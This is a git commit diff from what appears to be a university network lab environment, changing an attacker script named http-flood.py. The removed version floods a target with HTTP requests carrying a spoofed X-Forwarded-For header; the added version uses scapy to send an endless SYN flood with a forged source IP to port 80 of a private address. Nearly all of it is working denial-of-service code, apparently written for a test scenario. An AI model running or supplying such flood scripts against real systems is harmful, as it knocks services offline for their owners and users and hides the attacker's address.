c28341264f4f3c7855bf4376a560b86b26a3253f
root <root@fibra-teste.c3sl.ufpr.br>
2025-04-09 14:49:21 -0300

    novo cenario

--- ambiente/attacker-config/http-flood.py
+++ ambiente/attacker-config/http-flood.py
@@ -1,17 +1,13 @@
-import requests
-import threading
+from scapy.all import *
 
-target = "http://172.20.1.2"
+target_ip = "172.20.1.2"
 spoofed_ip = "172.20.1.3"
 
 def attack():
-    while True:
-        try:
-            headers = {'X-Forwarded-For': spoofed_ip}
-            requests.get(target, headers=headers)
-        except NameError:
-            print("ERRO: ", NameError)
-            pass
+  while True:
+        ip = IP(src=spoofed_ip, dst=target_ip)
+        tcp = TCP(sport=RandShort(), dport=80, flags="S")
+        send(ip/tcp, verbose=0)
 
 print("Iniciando ataque!")
 for _ in range(50):
